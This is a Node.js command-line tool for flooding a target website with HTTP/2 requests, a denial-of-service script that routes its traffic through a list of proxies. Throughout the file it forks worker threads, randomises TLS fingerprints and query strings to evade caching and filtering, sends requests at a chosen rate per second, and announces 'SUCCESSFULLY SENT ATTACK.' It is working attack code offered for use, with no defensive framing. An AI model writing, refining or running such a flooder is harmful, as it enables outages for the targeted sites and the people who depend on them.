const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require('axios');
const cheerio = require('cheerio'); 
const gradient = require("gradient-string");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(gradient.vice(`[!] node 404.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

// modern URL API (Fix for DEP0169)
const parsedTarget = new URL(args.target);

const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
]; 

const lang_header = ["en-US,en;q=0.9"];
const encoding_header = ["gzip, deflate, br"];
const control_header = ["no-cache", "max-age=0"];
const refers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/"
];

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36"
];

var cipper = randomElement(cplist);
var siga = randomElement(sig);
var accept = randomElement(accept_header);
var lang = randomElement(lang_header);
var encoding = randomElement(encoding_header);
var control = randomElement(control_header);
var proxies = readLines(args.proxyFile);

if (cluster.isPrimary || cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            if (chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            }
            connection.destroy();
            return callback(undefined, "error: invalid proxy response");
        });

        connection.on("timeout", () => { connection.destroy(); });
        connection.on("error", () => { connection.destroy(); });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":"); 

    // headers setup
    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.hostname;
    headers[":path"] = parsedTarget.pathname + (parsedTarget.search || "") + (parsedTarget.search ? "&" : "?") + randstr(5) + "=" + randstr(25);
    headers[":scheme"] = "https";
    headers["accept-language"] = lang;
    headers["accept-encoding"] = encoding;
    headers["cache-control"] = control;
    headers["accept"] = accept;
    headers["user-agent"] = randstr(15);
    headers["referer"] = "https://" + parsedTarget.hostname + "/?" + randstr(15);
    headers["origin"] = "https://" + parsedTarget.hostname;

    const proxyOptions = {
        host: parsedProxy[0],
        port: Number(parsedProxy[1]),
        address: parsedTarget.hostname + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            sigalgs: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + ":" + cipper,
            ecdhCurve: "prime256v1:X25519",
            rejectUnauthorized: false,
            servername: parsedTarget.hostname,
            secureProtocol: "TLS_method",
        };

        const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions); 

        tlsConn.on("secureConnect", () => {
            const client = http2.connect(parsedTarget.origin, {
                protocol: "https:",
                createConnection: () => tlsConn,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 65536,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(headers).on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 1000);
                setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
            });
            
            client.on("error", () => {
                client.destroy();
                connection.destroy();
            });
        });
    });
}

console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
setTimeout(() => process.exit(1), args.time * 1000);
